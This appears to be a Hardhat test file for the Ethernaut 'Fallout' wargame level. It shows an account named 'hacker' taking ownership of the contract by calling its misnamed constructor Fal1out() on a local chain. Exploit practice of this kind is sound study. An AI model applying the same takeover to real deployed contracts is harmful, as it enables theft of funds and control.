const { expect, assert } = require("chai")
const { getNamedAccounts, ethers, deployments } = require("hardhat")
const { deploy } = deployments

describe("Fallout Test", () => {
    let deployer, fallout, hacker
    beforeEach(async function () {
        const { log } = deployments
        deployer = (await getNamedAccounts()).deployer
        accounts = await ethers.getSigners()
        hacker = accounts[1]

        const deployIt = await deploy("Fallout", {
            from: deployer,
            args: [],
            log: true,
        })
        fallout = await ethers.getContract("Fallout", deployer)
    })

    it("Null address for the owner", async function () {
        expect(fallout.address).to.not.equal(0)
        console.log(fallout.address)
    })
    it("Checks the deployer is owner",async()=>{
        const owner = await fallout.owner()
        
        expect(owner.toString()).to.equal("0x0000000000000000000000000000000000000000")
    })
    it("Changes  the owner to the hacker",async()=>{
        const hackerContract = fallout.connect(hacker)
        const tx = await hackerContract.Fal1out()
        await tx.wait(1)
        const newOwner = await fallout.owner()
        assert.equal(newOwner,hacker.address)
    })
})

module.exports.tags = ["fallout", "all"]
